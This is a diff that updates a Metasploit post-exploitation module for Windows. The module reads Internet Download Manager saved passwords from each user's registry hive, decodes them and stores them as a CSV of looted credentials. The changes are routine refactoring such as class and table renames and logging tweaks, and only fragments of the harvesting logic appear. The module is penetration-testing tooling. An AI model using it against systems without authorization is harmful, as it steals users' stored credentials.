@@ -1,12 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
 
@@ -24,7 +23,7 @@ class Metasploit3 < Msf::Post
       'Author'        =>
         [
           'sil3ntdre4m <sil3ntdre4m[at]gmail.com>',
-          'SecurityXploded Team <contact[at]securityxploded.com>'
+          'Unknown', # SecurityXploded Team, www.SecurityXploded.com
         ],
       'Platform'      => [ 'win' ],
       'SessionTypes'  => [ 'meterpreter' ]
@@ -32,7 +31,7 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-    creds = Rex::Ui::Text::Table.new(
+    creds = Rex::Text::Table.new(
         'Header'  => 'Internet Downloader Manager Credentials',
         'Indent'   => 1,
         'Columns' =>
@@ -52,7 +51,7 @@ class Metasploit3 < Msf::Post
       begin
         subkeys = registry_enumkeys("HKU\\#{k}\\Software\\DownloadManager\\Passwords\\")
         if subkeys.nil? or subkeys.empty?
-          print_status ("IDM not installed for this user.")
+          print_status("IDM not installed for this user.")
           return
         end
 
@@ -74,8 +73,7 @@ class Metasploit3 < Msf::Post
           'idm_user_creds.csv',
           'Internet Download Manager User Credentials'
         )
-
-        print_status("IDM user credentials saved in: #{path}")
+        print_good("IDM user credentials saved in: #{path}")
 
       rescue ::Exception => e
         print_error("An error has occurred: #{e.to_s}")
@@ -92,5 +90,4 @@ class Metasploit3 < Msf::Post
     end
     return pass.pack("C*")
   end
-
 end
